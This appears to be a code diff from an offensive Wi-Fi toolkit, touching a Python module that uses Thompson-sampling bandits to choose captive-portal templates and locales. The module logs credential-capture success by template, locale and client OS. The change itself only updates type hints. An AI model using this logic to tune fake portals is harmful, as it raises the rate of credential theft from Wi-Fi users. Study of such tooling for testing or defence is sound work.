@@ -1,11 +1,11 @@
 # Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
 """Otimização de templates de portal cativo com bandit Thompson sampling."""
 
-from __future__ import annotations
 
 import logging
+from collections.abc import Mapping, Sequence
 from dataclasses import dataclass
-from typing import Any, Dict, Mapping, Optional, Sequence, Tuple
+from typing import Any
 
 logger = logging.getLogger(__name__)
 
@@ -32,7 +32,7 @@ class PortalRecommendation:
     locale: str
     confidence: float
     reasoning: str
-    credential_fields: Tuple[str, ...] = ("username", "password")
+    credential_fields: tuple[str, ...] = ("username", "password")
 
 
 class PortalOptimizer:
@@ -42,11 +42,11 @@ class PortalOptimizer:
     Regista conversões por combinação (template, locale, SO) para relatórios.
     """
 
-    def __init__(self, templates: Optional[Sequence[str]] = None, locales: Optional[Sequence[str]] = None) -> None:
+    def __init__(self, templates: Sequence[str] | None = None, locales: Sequence[str] | None = None) -> None:
         import random as _random
 
         self._random = _random
-        self._templates: Tuple[str, ...] = tuple(
+        self._templates: tuple[str, ...] = tuple(
             templates
             or (
                 "wifi_connect",
@@ -56,20 +56,20 @@ class PortalOptimizer:
                 "isp_login",
             )
         )
-        self._locales: Tuple[str, ...] = tuple(locales or ("pt_BR", "en_US", "es_ES"))
-        self._alpha: Dict[Tuple[str, str], float] = {}
-        self._beta: Dict[Tuple[str, str], float] = {}
+        self._locales: tuple[str, ...] = tuple(locales or ("pt_BR", "en_US", "es_ES"))
+        self._alpha: dict[tuple[str, str], float] = {}
+        self._beta: dict[tuple[str, str], float] = {}
         for t in self._templates:
             for loc in self._locales:
                 self._alpha[(t, loc)] = 1.0
                 self._beta[(t, loc)] = 1.0
-        self._stats: Dict[str, Dict[str, Any]] = {
+        self._stats: dict[str, dict[str, Any]] = {
             "attempts": {},
             "successes": {},
             "by_os": {},
         }
 
-    def _sample_theta(self, key: Tuple[str, str]) -> float:
+    def _sample_theta(self, key: tuple[str, str]) -> float:
         a = self._alpha[key]
         b = self._beta[key]
         rng = _np_rng()
@@ -80,7 +80,7 @@ class PortalOptimizer:
         jitter = (self._random.random() - 0.5) * 0.15
         return max(0.0, min(1.0, mean + jitter))
 
-    def recommend(self, context: Dict[str, Any]) -> PortalRecommendation:
+    def recommend(self, context: dict[str, Any]) -> PortalRecommendation:
         """Escolhe template e locale com maior amostra Thompson dado o contexto.
 
         Args:
@@ -98,7 +98,7 @@ class PortalOptimizer:
         hour = float(context.get("hour", 12))
 
         # Priors fracos por contexto (shift das Betas antes da amostra)
-        boosts: Dict[Tuple[str, str], float] = {}
+        boosts: dict[tuple[str, str], float] = {}
         for t in self._templates:
             for loc in self._locales:
                 boost = 0.0
@@ -116,7 +116,7 @@ class PortalOptimizer:
                     boost += 0.03
                 boosts[(t, loc)] = boost
 
-        best_key: Optional[Tuple[str, str]] = None
+        best_key: tuple[str, str] | None = None
         best_sample = -1.0
         for t in self._templates:
             for loc in self._locales:
@@ -130,7 +130,7 @@ class PortalOptimizer:
         tpl, loc = best_key
         top_os = max(os_dist, key=os_dist.get) if os_dist else "unknown"
 
-        fields: Tuple[str, ...]
+        fields: tuple[str, ...]
         if enterprise:
             fields = ("username", "password", "otp_hint")
         else:
@@ -155,7 +155,7 @@ class PortalOptimizer:
         template: str,
         locale: str,
         success: bool,
-        client_os: Optional[str] = None,
+        client_os: str | None = None,
     ) -> None:
         """Atualiza Betas após uma tentativa de captura.
 
@@ -184,9 +184,9 @@ class PortalOptimizer:
             if success:
                 bucket["successes"] += 1
 
-    def report(self) -> Dict[str, Any]:
+    def report(self) -> dict[str, Any]:
         """Estatísticas agregadas de desempenho por template/locale/OS."""
-        rates: Dict[str, float] = {}
+        rates: dict[str, float] = {}
         for k, att in self._stats["attempts"].items():
             succ = self._stats["successes"].get(k, 0)
             rates[k] = float(succ) / float(max(1, att))
